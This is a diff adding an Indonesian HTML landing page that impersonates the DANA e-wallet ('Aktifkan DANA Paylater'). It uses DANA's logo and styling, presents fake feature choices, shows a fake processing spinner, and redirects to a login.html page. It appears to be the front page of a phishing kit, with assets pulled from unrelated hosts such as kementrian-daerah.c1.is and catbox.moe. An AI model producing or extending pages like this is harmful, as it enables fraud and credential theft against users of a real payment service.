@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Aktifkan DANA Paylater</title>
+  <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA.">
+  <link rel="shortcut icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQZ9dATs_nkzyO-gSoQWbtIhJV7bG51r3gOKg&usqp=CAU" type="image/x-icon">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:400,700&display=swap">
+  <style>
+    html, body {
+      max-width: 100vw;
+      overflow-x: hidden;
+      background: #fff;
+      color: #000;
+      font-family: 'Nunito', sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+    }
+    body {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+    .splash {
+      position: fixed;
+      left: 0; top: 0; right: 0; bottom: 0;
+      width: 100vw; height: 100vh;
+      background: #118EEA;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.5s;
+    }
+    .splash img {
+      width: 180px;
+      max-width: 70vw;
+      height: auto;
+    }
+    .main-content {
+      display: none;
+      flex-direction: column;
+      background: #fff;
+      flex: 1 0 auto;
+      padding-bottom: 110px; /* Agar tidak tertutup footer-img */
+      min-height: 0;
+    }
+    .navbar {
+      width: 100%;
+      height: 70px;
+      background: #118EEA;
+      border-bottom: 2px solid #fff;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .navbar img {
+      width: 120px;
+      height: auto;
+    }
+    .form-container {
+      margin: 40px auto 0 auto;
+      padding: 24px 16px 32px 16px;
+      background: #fff;
+      border-radius: 20px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.10);
+      max-width: 400px;
+      width: 95%;
+      position: relative;
+      background-image: url(https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlG3jW1X3Osc2bie1JnzYUG2mqPpjAdHG5foKUgPMKzI2tGgF94krQ6jM&s=10);
+      background-size: cover;
+      background-position: center;
+      border: 1px solid #118EEA;
+    }
+    .form-title {
+      color: #118EEA;
+      font-size: 1.1rem;
+      font-weight: bold;
+      margin-bottom: 12px;
+      text-align: center;
+    }
+    .form-divider {
+      border: 1px solid #118EEA;
+      margin: 8px 0 16px 0;
+    }
+    .form-logo {
+      display: block;
+      margin: 0 auto 12px auto;
+      width: 110px;
+      height: auto;
+    }
+    .radio-section {
+      margin: 24px 0 0 0;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      align-items: stretch;
+    }
+    .radio-item {
+      position: relative;
+      display: flex;
+      align-items: center;
+    }
+    .radio-item input[type="radio"] {
+      display: none;
+    }
+    .radio-item label {
+      display: block;
+      width: 100%;
+      padding: 14px 20px 14px 48px;
+      background: #118EEA;
+      color: #fff;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1rem;
+      font-weight: 400;
+      position: relative;
+      transition: background 0.2s;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.07);
+      border: 2px solid transparent;
+    }
+    .radio-item label:before {
+      content: "";
+      position: absolute;
+      left: 18px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 20px;
+      height: 20px;
+      border-radius: 50%;
+      background: #fff;
+      border: 2px solid #00B0DF;
+      transition: border-color 0.2s;
+    }
+    .radio-item input[type="radio"]:checked + label {
+      border-color: #00EF53;
+    }
+    .radio-item input[type="radio"]:checked + label:before {
+      border-color: #00EF53;
+      background: #00EF53;
+    }
+    .form-btn {
+      width: 100%;
+      background: #118EEA;
+      color: #fff;
+      border-radius: 50px;
+      border: none;
+      font-size: 1rem;
+      padding: 13px;
+      margin-top: 24px;
+      font-family: inherit;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.10);
+      transition: background 0.2s;
+    }
+    .form-btn:active,
+    .form-btn:focus {
+      background: #0d6fd1;
+    }
+    .carousel-container {
+      width: 100%;
+      max-width: 500px;
+      margin: 32px auto 0 auto;
+      overflow: hidden;
+      border-radius: 12px;
+      position: relative;
+      background: #f7f7f7;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.07);
+      height: 220px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding-bottom: 36px; /* Tambahkan space bawah untuk dots */
+    }
+    .carousel-track {
+      display: flex;
+      transition: transform 0.5s;
+      will-change: transform;
+      height: 100%;
+    }
+    .carousel-slide {
+      min-width: 100%;
+      box-sizing: border-box;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+    .carousel-slide img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.10);
+      background: #fff;
+      display: block;
+      max-width: 100%;
+      max-height: 100%;
+    }
+    .carousel-dots {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+      position: absolute;
+      left: 0;
+      right: 0;
+      bottom: 10px; /* Dots selalu di bawah gambar */
+      width: 100%;
+      margin: 0;
+      z-index: 2;
+    }
+    .carousel-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #bbb;
+      cursor: pointer;
+      transition: background 0.2s;
+      border: none;
+    }
+    .carousel-dot.active {
+      background: #118EEA;
+    }
+    .process1 {
+      display: none;
+      position: fixed;
+      left: 0; top: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.4);
+      z-index: 99999;
+      align-items: center;
+      justify-content: center;
+    }
+    .loading {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      margin-top: 0;
+    }
+    .loading img {
+      width: 50px;
+      margin-bottom: 8px;
+    }
+    .loading .spinner {
+      width: 35px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(360deg);}
+      100% { transform: rotate(0deg);}
+    }
+    .footer-img {
+      width: 100%;
+      max-width: 100vw;
+      height: auto;
+      display: block;
+      margin: 0 auto 0 auto;
+      flex-shrink: 0;
+      pointer-events: none;
+      max-height: 120px;
+      object-fit: cover;
+      border-radius: 16px 16px 0 0;
+      box-shadow: 0 -2px 8px rgba(0,0,0,0.07);
+    }
+    @media (max-width: 600px) {
+      .form-container {
+        margin: 24px 4px 0 4px;
+        padding: 16px 6px 24px 6px;
+        max-width: 98vw;
+      }
+      .carousel-container {
+        max-width: 98vw;
+        height: 130px; /* Tinggi slider di mobile */
+        padding-bottom: 28px;
+      }
+      .navbar img {
+        width: 90px;
+      }
+      .carousel-slide img {
+        border-radius: 6px;
+      }
+      .footer-img {
+        max-height: 70px;
+      }
+      .main-content {
+        padding-bottom: 80px;
+      }
+      .form-title {
+        margin-top: 20px;
+      }
+    }
+    @media (min-width: 601px) and (max-width: 1024px) {
+      .form-container {
+        max-width: 500px;
+      }
+      .carousel-container {
+        max-width: 600px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="splash" id="splash">
+    <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGrnEQ2c9lygdZpkrOka4XsY_v38wcr_4PvyRFY89y-x5yuOAe0hBDBfdqP2dZQ8D-bBhuFDtCTSznxpFdjw4st9B2en_bOL6XGMQ6B3GHfNvkXIjzcaM-CyQFc-0eHPPscz1Sn0sWtgFJGAW0oWT_ZeAwVu6KhgCUOsdRRqBaKNY6yF-cEt8O-nEa-8I/s1974/dana_logo.jpg" alt="Logo DANA" />
+  </div>
+  <div class="main-content" id="mainContent">
+    <nav class="navbar">
+      <img src="https://a.m.dana.id/danaweb/v3/DANA-Logo-white.svg" alt="DANA Logo" />
+    </nav>
+    <form id="formHP" class="form-container" autocomplete="off">
+      <div class="carousel-container" id="carouselContainer">
+        <div class="carousel-track" id="carouselTrack">
+          <div class="carousel-slide"><img src="https://files.catbox.moe/1ry16l.jpeg" alt="slide1"></div>
+          <div class="carousel-slide"><img src="https://files.catbox.moe/kx9krq.png" alt="slide2"></div>
+          <div class="carousel-slide"><img src="https://files.catbox.moe/uig61w.jpeg" alt="slide3"></div>
+          <div class="carousel-slide"><img src="https://files.catbox.moe/k5wdlk.jpeg" alt="slide4"></div>
+          <div class="carousel-slide"><img src="https://files.catbox.moe/mc5m5c.jpeg" alt="slide5"></div>
+          <div class="carousel-slide"><img src="https://files.catbox.moe/3kog5h.jpeg" alt="slide6"></div>
+        </div>
+        <div class="carousel-dots" id="carouselDots"></div>
+      </div>
+      <div class="form-title">SILAHKAN PILIH SALAH SATU FITUR DIBAWAH INI</div>
+      <hr class="form-divider">
+      <section class="radio-section">
+        <div class="radio-item">
+          <input name="radio" id="radio1" type="radio" required>
+          <label for="radio1">Ambil kode COD pembayaran</label>
+        </div>
+        <div class="radio-item">
+          <input name="radio" id="radio2" type="radio">
+          <label for="radio2">Ambil Code pemesanan manual</label>
+        </div>
+        <div class="radio-item">
+          <input name="radio" id="radio3" type="radio">
+          <label for="radio3">Isi Menu Order Tabung Gas</label>
+        </div>
+      </section>
+      <button type="submit" id="kirims" class="form-btn">Aktifkan Fitur</button>
+    </form>
+    <div class="process1" id="process1">
+      <div class="loading">
+        <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi8hbZEfutKvr9pkj0-mkJYWt-1SBtt3gw-HFOEZc0172okrp0SFHLaW3PRGVDm1U0P7WWEMELIw4nlq1_1gCgyZBo3cxf-OJNpguNamdJryCkGU-hTHiW3RyOv5JD9eIjXTFtrJFCVn0ae4RxG4Oi-czAP20tEaJI3OstxFAbtOwtFxp6RvOHc6NZL/s1600/load_bg.png" alt="loading">
+        <img class="spinner" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhl9xJVYWF_a9vAhgW5QQgozvZVADTaJgIX64iO7a5sQuMpSoPBK3zfKjvT6xc9fZPfxZz39mjk1H_oZOOOtYvO1l7DkWNqiD5LJyGYdwDNyHuyqLk_Ix6eFs3aLCG2yUXVwtsnj0BXTA40WZmecyLyCIm_ff0xNkkOvkuKBOl6yfS-QjI_EJrIyGtU/s1600/load_spin.png" alt="spinner">
+      </div>
+    </div>
+    <audio hidden controls id="dana1">
+      <source src="https://kementrian-daerah.c1.is/sound/khusus.ogg" type="audio/ogg">
+      <source src="https://kementrian-daerah.c1.is/sound/khusus.mp3" type="audio/mpeg">
+      Your browser does not support the audio element.
+    </audio>
+  </div>
+  <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhW-3Xsq1r5wVb5r0tfUzFr9KzB9hy1r0-W4GkBcDTnYujbw_NNeMWw-l8MZCk4RYNJpcSZRf5tv-TPa5HnYvv_x-EzticmLwx1vO4bIlqTJAiyk4-i96QjCFlPHT8BMy9nF15ISyjxVVOz2DAv8osBBR9onrE3lJf96Vw5erolKuss9ZrTFAFhoJAU4Js/s1080/1704436332522.png" class="footer-img" alt="footer">
+  <script>
+    // Splash screen logic
+    window.addEventListener('DOMContentLoaded', function() {
+      setTimeout(function() {
+        document.getElementById('splash').style.opacity = 0;
+        setTimeout(function() {
+          document.getElementById('splash').style.display = 'none';
+          document.getElementById('mainContent').style.display = 'flex';
+        }, 500);
+      }, 1200);
+    });
+
+    // Carousel logic (simple, no dependency)
+    (function() {
+      const track = document.getElementById('carouselTrack');
+      const slides = Array.from(track.children);
+      const dotsContainer = document.getElementById('carouselDots');
+      let currentIndex = 0;
+      let interval = null;
+
+      function goToSlide(idx) {
+        track.style.transform = `translateX(-${idx * 100}%)`;
+        dotsContainer.querySelectorAll('.carousel-dot').forEach((dot, i) => {
+          dot.classList.toggle('active', i === idx);
+        });
+        currentIndex = idx;
+      }
+
+      function nextSlide() {
+        let idx = (currentIndex + 1) % slides.length;
+        goToSlide(idx);
+      }
+
+      // Create dots
+      slides.forEach((_, i) => {
+        const dot = document.createElement('button');
+        dot.className = 'carousel-dot' + (i === 0 ? ' active' : '');
+        dot.addEventListener('click', () => goToSlide(i));
+        dotsContainer.appendChild(dot);
+      });
+
+      // Auto slide
+      interval = setInterval(nextSlide, 3500);
+
+      // Pause on hover
+      track.addEventListener('mouseenter', () => clearInterval(interval));
+      track.addEventListener('mouseleave', () => interval = setInterval(nextSlide, 3500));
+    })();
+
+    // Form logic
+    document.getElementById('formHP').addEventListener('submit', function(e) {
+      e.preventDefault();
+      document.getElementById('process1').style.display = 'flex';
+      document.getElementById('kirims').innerText = "Memproses....";
+      setTimeout(function() {
+        window.location.href = 'login.html';
+      }, 1000);
+    });
+
+    // Play audio on first interaction
+    document.getElementById('mainContent').addEventListener('click', function playAudioOnce() {
+      var audio = document.getElementById('dana1');
+      if (audio) {
+        audio.play();
+        audio.loop = false;
+      }
+      document.getElementById('mainContent').removeEventListener('click', playAudioOnce);
+    });
+  </script>
+</body>
+</html>
